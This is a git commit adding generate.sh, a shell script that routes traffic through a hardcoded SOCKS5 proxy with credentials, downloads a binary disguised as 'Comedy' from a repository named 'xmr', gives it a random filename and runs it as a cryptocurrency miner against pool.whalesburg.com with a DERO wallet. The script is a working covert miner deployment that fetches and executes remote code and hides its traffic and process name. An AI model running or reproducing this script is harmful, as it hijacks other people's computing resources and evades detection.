74fbaf5ccd81629a0282eefeef23b13f84845688
Tania Putri <lukisanwarna469@gmail.com>
2022-08-28 18:58:01 +0000

    generate.sh created online with Bitbucket

---
+++ generate.sh
@@ -0,0 +1,37 @@
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 45.155.69.201:6406
+socks5_username = ingfoingfo
+socks5_password = maszZeehh
+END
+
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+echo " "
+echo " "
+
+echo ""
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo " "
+echo " "
+
+GOGO=$(shuf -i 10000-999999999 -n 1)
+
+./graftcp/graftcp wget https://github.com/catursawah/xmr/raw/main/Comedy
+
+mv -f Comedy $GOGO
+chmod 777 $GOGO
+
+./graftcp/graftcp ./$GOGO -r pool.whalesburg.com:4300 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xc8qq9zcva6ed7qart0hh.TUKIJEM
+
